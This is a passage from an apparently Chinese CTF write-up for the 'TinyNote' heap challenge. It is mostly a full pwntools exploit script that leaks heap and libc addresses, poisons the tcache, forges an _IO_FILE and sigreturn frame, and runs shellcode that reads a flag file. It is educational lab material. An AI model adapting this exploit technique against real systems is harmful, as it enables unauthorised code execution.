class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x820</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x830</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x840</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x850</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x860</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x870</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x880</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x890</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8a0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x8b0</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x8c0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((libc_base + libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] + <span class="number">0x60</span> - <span class="number">0x10</span>) ^ key)+ p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x90</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Dlete(<span class="number">1</span>)</span><br><span class="line">Edit(<span class="number">1</span>, p64(key ^ (heap_base + <span class="number">0x810</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(key))</span><br><span class="line">Add(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>在此时fastbin的状态如下</p><p><img src="https://pic.imgdb.cn/item/619bc6992ab3f51d91b93e94.png" alt></p><p>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add(0)</span><br></pre></td></tr></table></figure><p>大胜利！</p><p><img src="https://pic.imgdb.cn/item/619bc70d2ab3f51d91b97566.png" alt></p><h3 id="0x03-完成exp"><a href="#0x03-完成exp" class="headerlink" title="0x03 完成exp"></a>0x03 完成exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">libc = ELF(<span class="string">'/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6'</span>)</span><br><span class="line">sh = process(<span class="string">'./TinyNote'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Menu</span><span class="params">(choice)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    sh.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dlete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>)</span><br><span class="line">Add(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">'heapbase: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x31</span>):</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x330</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x340</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">2</span>)</span><br><span class="line">Show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x1e0c00</span>  </span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    Add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1e2560</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">setcontext = libc_base + <span class="number">0x52970</span> + <span class="number">61</span></span><br><span class="line">gadget = libc_base + <span class="number">0x000000000014a0a0</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x500</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x508</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable) </span><br><span class="line">payload = fake_IO_FILE + <span class="string">b'/bin/sh\x00'</span> + <span class="number">2</span>*p64(setcontext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span> + <span class="number">1</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x20</span> + <span class="number">0x10</span>*i)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>:(i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"><span class="comment"># put free_hook on tcache in 0x80 size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0xc0</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64((free_hook)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set tcache size</span></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x10</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x101000000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write rdi address </span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x500</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(gadget) + p64(<span class="number">0x300</span> + heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set shellcode addr</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x520</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x900</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># set frame</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">mov rax,0x67616c662f2e</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">mov rsi,0</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,1024</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rax,60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = heap_base + <span class="number">0x528</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x5000</span></span><br><span class="line">frame.rdx = <span class="number">4</span> | <span class="number">2</span> | <span class="number">1</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'mprotect'</span>] + libc_base</span><br><span class="line">payload = bytes(frame)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x300</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x320</span>)))</span><br><span class="line"></span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(setcontext))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # set shellcode in heap</span></span><br><span class="line">payload = bytes(asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)//<span class="number">0x10</span>):</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">    Dlete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x900</span> + i*<span class="number">0x10</span>)))</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line">    Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">2</span>, payload[i*<span class="number">0x10</span>: (i+<span class="number">1</span>)*<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># #Create a fake fastbin chains</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x820</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x830</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x840</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x850</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span class="line">Edit(<span class="number">0</span>, p64(key ^ (heap_base + <span class="number">0x860</span>)))</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">2</span>, p64(key ^ (heap_base + <span class="number">0x870</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">Dlete(<span class="number">0</span>)</span><br><span 